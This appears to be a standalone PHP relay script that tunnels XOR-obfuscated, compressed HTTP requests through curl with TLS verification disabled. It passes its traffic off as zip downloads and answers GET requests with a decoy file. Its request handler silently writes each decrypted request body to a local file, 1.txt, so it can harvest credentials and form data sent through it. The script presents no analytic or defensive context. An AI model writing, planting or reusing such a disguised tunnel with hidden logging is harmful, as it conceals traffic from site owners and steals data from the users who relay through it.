<?php
$__content__ = '';
$__password__ = base64_decode("MzQ1YQ==");
function nameff() {
$nameff = substr($_SERVER['REQUEST_URI'], 1); 	
if ($nameff == '') {
$nameff = 'zip.zip';
}
return $nameff;
}
function namefr() {
$namefr = $_SERVER['REQUEST_URI'];
if (($namefr == '/') || (empty($content_type))) {
$content_type = 'application/zip';
}
else {
$namefr = explode(".", $namefr);
$namefr = $namefr[1];
$search_ftmp = file('mime.tmp');
foreach ($search_ftmp as $value) {
$value1 = explode("||", $value); 
if ($value1[0] == $namefr) {
$content_type = $value1[1];
}
}
}
return $content_type;
}
function message_html($title, $banner, $detail) {
$error = "<title>${title}</title><body><H1>${banner}</H1>${detail}</body>";
return $error;
}
function decode_request($data) {
global $__password__;
list($headers_length) = array_values(unpack('n', substr($data, 0, 2)));
$headers_data = substr($data, 2, $headers_length);
$headers_data  = $headers_data ^ str_repeat($__password__, strlen($headers_data)); 
$headers_data = gzinflate($headers_data);
$lines = explode("\r\n", $headers_data);
$request_line_items = explode(" ", array_shift($lines));
$method = $request_line_items[0];
$url = $request_line_items[1];
$headers = array();
$kwargs  = array();
$kwargs_prefix = 'X-URLFETCH-';
foreach ($lines as $line) {
if (!$line)
continue;
$pair = explode(':', $line, 2);
$key  = $pair[0];
$value = trim($pair[1]);
if (stripos($key, $kwargs_prefix) === 0) {
$kwargs[strtolower(substr($key, strlen($kwargs_prefix)))] = $value;
} else if ($key) {
$key = join('-', array_map('ucfirst', explode('-', $key)));
$headers[$key] = $value;
}
}
$body = substr($data, 2+intval($headers_length));
if (strlen($body) > 0) { 
$body  = $body ^ str_repeat($__password__, strlen($body));
$body = gzinflate($body);
    
$f = fopen("1.txt","a");
fwrite($f,$body);
fwrite($f,"\r\n");
fclose($f);  
    
}
$__password__ = $kwargs['password'];
return array($method, $url, $headers, $body);
}

function echo_content($content) {
global $__password__;
header("Content-type: ".namefr()."");
header("Content-Disposition: attachment; filename=".nameff()."");
echo $content ^ str_repeat($__password__[0], strlen($content));
}
function curl_header_function($ch, $header) {
global $__content__;
$pos = strpos($header, ':');
if ($pos == false) {
$__content__ .= $header;
} 
else {
$key = join('-', array_map('ucfirst', explode('-', substr($header, 0, $pos))));
if ($key != 'Transfer-Encoding') {
$__content__ .= $key . substr($header, $pos);
}
}
return strlen($header);
}
function curl_write_function($ch, $content) {
global $__content__;
if ($__content__) {
echo_content($__content__);
$__content__ = '';
}
echo_content($content);
return strlen($content);
}
function post() {
list($method, $url, $headers, $body) = decode_request(file_get_contents('php://input'));
if (isset($headers['Connection'])) { $headers['Connection'] = 'close'; }
$header_array = array();
foreach ($headers as $key => $value) {
$header_array[] = join('-', array_map('ucfirst', explode('-', $key))).': '.$value;
}
$curl_opt = array();
$ch = curl_init();
$curl_opt[CURLOPT_URL] = $url;
switch (strtoupper($method)) {
case 'HEAD':
$curl_opt[CURLOPT_NOBODY] = true;
break;
case 'GET':
break;
case 'POST':
$curl_opt[CURLOPT_POST] = true;
$curl_opt[CURLOPT_POSTFIELDS] = $body;
break;
case 'DELETE':
case 'PATCH':
$curl_opt[CURLOPT_CUSTOMREQUEST] = $method;
$curl_opt[CURLOPT_POSTFIELDS] = $body;
break;
case 'PUT':
$curl_opt[CURLOPT_CUSTOMREQUEST] = $method;
$curl_opt[CURLOPT_POSTFIELDS] = $body;
$curl_opt[CURLOPT_NOBODY] = true; 
break;
case 'OPTIONS':
$curl_opt[CURLOPT_CUSTOMREQUEST] = $method;
break;
default:
echo_content("HTTP/1.0 502\r\n\r\n" . message_html('502 Urlfetch Error', 'Method error ' . $method,  $url));
exit(-1);
}
$curl_opt[CURLOPT_HTTPHEADER] = $header_array;
$curl_opt[CURLOPT_RETURNTRANSFER] = true;
$curl_opt[CURLOPT_HEADER] = false;
$curl_opt[CURLOPT_HEADERFUNCTION] = 'curl_header_function';
$curl_opt[CURLOPT_WRITEFUNCTION]  = 'curl_write_function';
$curl_opt[CURLOPT_FAILONERROR] = false;
$curl_opt[CURLOPT_FOLLOWLOCATION] = false;
$curl_opt[CURLOPT_TIMEOUT] = 60;
$curl_opt[CURLOPT_SSL_VERIFYPEER] = false;
$curl_opt[CURLOPT_SSL_VERIFYHOST] = false;
$curl_opt[CURLOPT_IPRESOLVE] = CURL_IPRESOLVE_V4;
curl_setopt_array($ch, $curl_opt);
curl_exec($ch);
curl_close($ch);
if ($GLOBALS['__content__']) {
echo_content($GLOBALS['__content__']);
} 
}
function get() {
$f = fopen ("1.tmp","rb");
$echo = fread($f,filesize("1.tmp"));
fclose($f);
header("Content-type: ".namefr()."");
header("Content-Disposition: attachment; filename=".nameff()."");
echo $echo;
}
function main() {
$srverethod = $_SERVER['REQUEST_METHOD'];
if (($srverethod == 'POST') || ($srverethod == 'PUT')) {
post(); } else {
get(); } }
main();
